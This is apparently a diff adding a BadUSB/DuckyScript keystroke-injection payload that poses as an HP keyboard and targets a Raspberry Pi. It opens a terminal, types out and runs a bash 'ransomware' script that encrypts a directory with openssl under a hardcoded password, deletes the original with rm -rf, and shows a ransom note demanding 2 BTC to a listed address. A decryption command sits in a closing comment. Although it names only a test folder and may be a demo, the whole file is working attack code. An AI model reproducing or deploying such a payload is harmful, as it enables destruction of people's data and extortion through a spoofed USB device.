@@ -1,0 +1,174 @@
+#### ID 03f0:0324 FakeHP Devices:FakeHPKeyboardWithBadIntentions
+
+#### REM Target: Raspberry Pi 4 (RaspiOS AZERTY)
+
+DEFAULT_DELAY 50
+DEFAULT_STRING_DELAY 10
+DELAY 1000
+
+#### REM --- OPEN TERMINAL ---
+CTRL-ALT t
+DELAY 1000
+CTRL-ALT-UP
+DELAY 500
+
+#### REM --- FILE CREATION ---
+STRING cat << 'EOF' > TheCutestRansomware.sh
+ENTER
+DELAY 500
+
+#### REM --- START BASH SCRIPT ---
+STRING #!/bin/bash
+ENTER
+STRING TARGET_DIR="/home/doc-pavi-jilan/test"
+ENTER
+STRING ENC_FILE="$TARGET_DIR.locked.enc"
+ENTER
+STRING BTC_ADDR="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+ENTER
+
+#### REM --- DEFINE COLORS VIA TPUT (ZERO BRACKETS) ---
+STRING RED=$(tput setaf 1)
+ENTER
+STRING NC=$(tput sgr0)
+ENTER
+
+STRING clear
+ENTER
+STRING echo -e "$RED"
+ENTER
+STRING echo "#################################################"
+ENTER
+STRING echo "      SYSTEM BREACHED by LockedHealth 3.0"
+ENTER
+STRING echo "#################################################"
+ENTER
+STRING echo -e "$NC"
+ENTER
+STRING sleep 2
+ENTER
+
+#### REM --- TARGET VERIFICATION ---
+STRING if test -d "$TARGET_DIR"; then
+ENTER
+STRING      echo "Target identified: $TARGET_DIR"
+ENTER
+STRING else
+ENTER
+STRING      echo "Error: Target not found."
+ENTER
+STRING      exit 1
+ENTER
+STRING fi
+ENTER
+STRING sleep 1
+ENTER
+
+#### REM --- LOADING BAR ---
+STRING echo "Downloading payload... 30%"
+ENTER
+STRING sleep 1
+ENTER
+STRING echo "Downloading payload... 70%"
+ENTER
+STRING sleep 1
+ENTER
+STRING echo "Downloading payload... 100%"
+ENTER
+STRING echo "Cryptographic modules loaded."
+ENTER
+STRING sleep 1
+ENTER
+
+#### REM --- ENCRYPTION ---
+STRING echo -e "$RED>>> ENCRYPTING DATA... DO NOT TURN OFF POWER <<<$NC"
+ENTER
+STRING tar -czf - "$TARGET_DIR" 2>/dev/null | openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:hacker123 -out "$ENC_FILE"
+ENTER
+
+#### REM --- SUCCESS VERIFICATION ---
+STRING if test $? -eq 0; then
+ENTER
+STRING      echo "Encryption successful: $ENC_FILE"
+ENTER
+STRING      echo "Wiping original sectors..."
+ENTER
+STRING      rm -rf "$TARGET_DIR"
+ENTER
+STRING      sleep 2
+ENTER
+STRING      clear
+ENTER
+STRING      echo -e "$RED"
+ENTER
+#### REM --- OLD ASCII ART ---
+STRING      echo "  ,ad8888ba,      YOU"
+ENTER
+STRING      echo " d8''    \`'8b      HAVE"
+ENTER
+STRING      echo "d8'               BEEN"
+ENTER
+STRING      echo "88                  SUCCESSFULLY"
+ENTER
+STRING      echo "88      88888        BREACHED"
+ENTER
+STRING      echo "Y8,        88          BY"
+ENTER
+STRING      echo " Y8a.    .a88           LockedHealth 3.0"
+ENTER
+STRING      echo "  \`'Y88888P'             <3"
+ENTER
+STRING      echo ""
+ENTER
+STRING      echo "================================================="
+ENTER
+STRING      echo "   ALL YOUR FILES ARE ENCRYPTED (AES-256)"
+ENTER
+STRING      echo "================================================="
+ENTER
+STRING      echo -e "$NC"
+ENTER
+STRING      echo "To restore your data, you must pay the ransom."
+ENTER
+STRING      echo "Payment required: 2 BTC"
+ENTER
+STRING      echo ""
+ENTER
+STRING      echo -e "$RED>> $BTC_ADDR <<$NC"
+ENTER
+STRING      echo ""
+ENTER
+STRING      echo "Warning: Attempting to recover files without our"
+ENTER
+STRING      echo "decryption tool will result in permanent data loss."
+ENTER
+STRING      echo ""
+ENTER
+STRING      echo "Note: It seems like you don't have any backup..."
+ENTER
+STRING      echo ""
+ENTER
+STRING      echo "Good luck :)"
+ENTER
+STRING      echo ""
+ENTER
+STRING else
+ENTER
+STRING      echo "Encryption failed. System lucky."
+ENTER
+STRING fi
+ENTER
+#### REM --- END OF FILE ---
+STRING EOF
+ENTER
+DELAY 500
+
+#### REM --- EXECUTION ---
+STRING chmod +x TheCutestRansomware.sh
+ENTER
+DELAY 500
+STRING ./TheCutestRansomware.sh
+ENTER
+
+#### REM --- RESTORE ENCRYPTED FILES COMMAND ---
+#### REM openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:hacker123 -in "$ENC_FILE" | tar -xzf -
